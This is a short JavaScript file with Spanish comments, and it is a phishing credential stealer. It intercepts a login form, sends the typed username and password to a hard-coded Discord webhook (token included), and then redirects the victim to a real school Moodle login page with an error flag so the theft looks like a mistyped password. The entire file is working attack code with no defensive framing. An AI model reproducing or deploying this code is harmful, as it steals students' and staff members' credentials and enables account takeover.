document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginbtn');

    if (form && usernameInput && passwordInput && loginBtn) {
        loginBtn.addEventListener('click', function(event) {
            event.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;
            // Construye el objeto con los datos del usuario
            const userData = {
                username: username,
                password: password
            };
            // Envía los datos al webhook de Discord
            enviarDatosDiscord(userData);
        });
    }

    function enviarDatosDiscord(data) {
        // URL del webhook de Discord
        const webhookURL = 'https://discord.com/api/webhooks/1227536146230415453/u7a_u18UKBa8D4cOF2eI0XY8ftTyc_Kpn0Ea1Ew-gmqTXGQCLDMgWmpOCoxK2HQtUSLR';
        // Datos a enviar al webhook
        const payload = {
            embeds: [{
                title: "",
                color: parseInt("00ff4e", 16), // Color personalizado en hexadecimal
                fields: [
                    {
                        name: "<:username:1227678315817472020> Usuario",
                        value: data.username
                    },
                    {
                        name: "<:password:1227678205079457864> Contraseña",
                        value: data.password
                    }
                ]
            }]
        };
        // Realiza la petición POST al webhook de Discord
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error al enviar los datos al webhook de Discord');
            }
            console.log('Datos enviados exitosamente al webhook de Discord');
            // Redirige al usuario a la página de Moodle con un mensaje de error
            window.location.href = 'https://elearning6.hezkuntza.net/012982/login/index.php?loginerror=1';
        })
        .catch(error => {
            console.error('Error al enviar los datos al webhook de Discord:', error);
            // En caso de error, envía un mensaje al webhook indicando el problema
            const errorMessage = {
                content: 'Hubo un problema al enviar los datos del formulario de inicio de sesión a Discord.'
            };
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(errorMessage)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Error al enviar el mensaje de error al webhook de Discord');
                }
                console.log('Mensaje de error enviado exitosamente al webhook de Discord');
            })
            .catch(error => {
                console.error('Error al enviar el mensaje de error al webhook de Discord:', error);
            });
        });
    }
});
